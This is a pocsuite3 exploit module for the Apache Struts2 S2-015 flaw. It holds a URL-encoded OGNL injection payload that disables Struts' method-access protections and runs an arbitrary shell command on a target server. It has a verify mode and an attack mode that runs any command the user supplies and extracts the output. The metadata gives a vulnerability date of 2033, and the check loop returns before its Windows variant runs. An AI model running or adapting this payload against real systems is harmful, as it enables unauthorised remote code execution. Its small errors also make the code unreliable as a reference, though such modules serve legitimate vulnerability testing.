from collections import OrderedDict
from urllib.parse import quote, unquote

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, get_middle_text
from pocsuite3.lib.core.enums import VUL_TYPE
from pocsuite3.lib.core.interpreter_option import OptString
from pocsuite3.lib.utils import random_str


class DemoPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    author = ['knownsec.com']
    vulDate = '2033-11-15'
    createDate = '2023-11-15'
    updateDate = '2023-11-15'
    references = ['https://cwiki.apache.org/confluence/display/WW/S2-015']
    name = 'Apache Struts2 s2-015'
    appPowerLink = ''
    appName = 'Apache Struts2'
    appVersion = 'Struts 2.0.0 - Struts 2.3.14.2'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''S2-015:影响版本Struts 2.0.0-2.3.14.2;'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    dockerfile = '''FROM isxiangyang/struts2-all-vul-pocsuite:latest'''

    def _options(self):
        o = OrderedDict()
        o["command"] = OptString('ls', description="可执行的shell命令")
        return o

    def _verify(self):
        p = self._check()
        if p:
            return self.parse_output(p)

    def _check(self):
        result = {}
        hash_str = random_str(10)
        command = [
            "echo " + hash_str,
            "cmd.exe /c echo " + hash_str
        ]
        for cmd in command:
            html = self.exp(cmd)

            if hash_str in html:
                result["VerifyInfo"] = {
                    "URL": self.url,
                }

            return result
        return False

    def exp(self, command):
        exec_payload = "%24%7B%23context%5B'xwork.MethodAccessor.denyMethodExecution'%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('{cmd}').getInputStream())%2C%23q%7D"
        payload = exec_payload.format(cmd=quote(command))
        html = requests.get(self.url + "/{payload}.action".format(payload=payload)).text
        return html

    def _attack(self):
        result = {}
        p = self._check()
        if p:
            command = self.get_option("command")
            html = self.exp(command)
            text = get_middle_text(html, "HTTP Status 404 - ", ".jsp")
            if text:
                result["VerifyInfo"] = {
                    "URL": self.url,
                    "HTML": unquote(text).replace("\x00", "").encode()
                }

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
